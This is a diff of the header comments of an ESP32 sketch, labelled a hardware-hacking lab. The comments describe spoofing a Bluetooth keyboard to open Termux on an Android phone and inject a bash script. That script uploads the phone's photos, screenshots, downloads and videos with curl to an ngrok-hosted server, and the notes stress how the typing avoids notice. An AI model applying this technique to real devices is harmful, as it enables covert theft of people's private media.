@@ -1,29 +1,34 @@
 // ─────────────────────────────────────────────────────────────────────────────
-// ANDROID · PIN 19 — Fetch ALL Media → macOS via ngrok
+// ESP32 BLE HID — Android Media Exfiltration Lab
+// ─────────────────────────────────────────────────────────────────────────────
 //
-// Target  : Android with Termux installed (F-Droid build)
-// Trigger : Button on GPIO 19
+// CTF / Hardware Hacking Lab — Authorized Devices Only.
+// USE ONLY ON DEVICES YOU OWN OR HAVE EXPLICIT WRITTEN AUTHORIZATION TO TEST.
 //
-// STEP 1: WIN (alone) → Home screen → type "Termux" → Enter
-// STEP 2: CTRL+C → CTRL+U   (clear Termux prompt)
-// STEP 3: upload helper function → one curl loop per folder:
-//           /sdcard/DCIM/Camera     → category: DCIM
-//           /sdcard/Pictures        → category: Pictures
-//           /sdcard/Pictures/Screenshots → category: Screenshots
-//           /sdcard/Download        → category: Downloads
-//           /sdcard/Movies          → category: Movies
+// WHAT THIS DOES:
+//   When GPIO 19 is pressed, the ESP32 impersonates a Bluetooth keyboard and:
+//     STEP 1: Navigates to Android home screen (WIN key alone)
+//     STEP 2: Opens Termux via launcher search
+//     STEP 3: Clears the shell prompt (CTRL+C, CTRL+U)
+//     STEP 4: Injects a bash heredoc payload that:
+//               - Loops /sdcard/DCIM/Camera, /sdcard/Pictures,
+//                 /sdcard/Pictures/Screenshots, /sdcard/Download, /sdcard/Movies
+//               - Computes SHA-256 for each media file
+//               - POSTs every file to WAN_SERVER_URL/upload via curl over ngrok
 //
-// ── WHY NOT WIN+S ────────────────────────────────────────────────────────────
-// WIN+S = SCREENSHOT on Android — NOT launcher search.
-// WIN alone = Home screen on all Android launchers.
-// Typing immediately after Home auto-opens the launcher search overlay.
+// TECHNIQUE NOTES:
+//   - BLE HID spoofing: ESP32 advertises as "ESP32 Keyboard" (legitimate HID device)
+//   - Keystroke injection: 35 ms/char — below typical human notice threshold
+//   - Heredoc delivery: full bash script injected without dropping any file
+//   - Win key alone = Home screen on all Android launchers (Win+S = screenshot)
+//   - Typing immediately after Home auto-opens the launcher search overlay
 //
-// Server  : fetch_photos/server/server.py  (port 8019)
-//           Run: ngrok http 8019  → paste URL in WAN_SERVER_URL below → re-flash
+// SERVER:
+//   fetch_photos/server/server.py  (port 8019)
+//   Run: ngrok http 8019  → paste URL in WAN_SERVER_URL below → re-flash
 //
-// Termux one-time setup (do this once on the phone):
-//   pkg install curl
-//   termux-setup-storage              ← tap Allow when Android prompts
+// TARGET DEVICE ONE-TIME SETUP (your own device):
+//   Install Termux from F-Droid → pkg install curl → termux-setup-storage
 // ─────────────────────────────────────────────────────────────────────────────
 
 #include <BleKeyboard.h>
